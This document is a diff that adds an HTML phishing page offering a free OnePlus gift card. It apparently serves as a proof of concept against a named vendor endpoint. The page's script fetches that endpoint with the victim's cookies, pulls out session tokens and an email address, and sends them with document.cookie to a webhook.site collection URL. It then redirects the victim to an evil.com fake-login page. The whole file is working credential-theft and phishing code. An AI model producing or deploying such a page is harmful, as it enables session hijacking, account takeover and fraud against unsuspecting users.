@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free OnePlus Coupon!</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    button { padding: 10px 15px; background: #f00; color: white; border: none; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>🎁 Claim Your Free OnePlus Gift Card!</h1>
+  <p>Click below to verify your eligibility:</p>
+  <button onclick="stealData()">Check Now</button>
+
+  <script>
+    async function stealData() {
+      // 1. Fetch sensitive data from the vulnerable endpoint (with cookies)
+      const response = await fetch("https://aem-static.wanyol.com/console/500", {
+        credentials: "include"  // Sends user's session cookies
+      });
+      const data = await response.text();
+
+      // 2. Extract session tokens or sensitive info (example regex)
+      const sessionToken = data.match(/sessionId=([a-zA-Z0-9]+)/)?.[1];
+      const userEmail = data.match(/email":"([^"]+)"/)?.[1];
+
+      // 3. Send stolen data to attacker's server
+      await fetch("	https://webhook.site/403d7ceb-ce71-4692-8f82-0d9eb1d50453", {
+        method: "POST",
+        body: JSON.stringify({
+          origin: window.location.href,
+          cookies: document.cookie,
+          sessionToken,
+          userEmail,
+          fullResponse: data  // Exfiltrate everything
+        }),
+        mode: "no-cors"
+      });
+
+      // 4. Optional: Redirect to a fake login page for further phishing
+      window.location.href = "https://evil.com/fake-login?prefill=" + encodeURIComponent(userEmail);
+    }
+  </script>
+</body>
+</html>
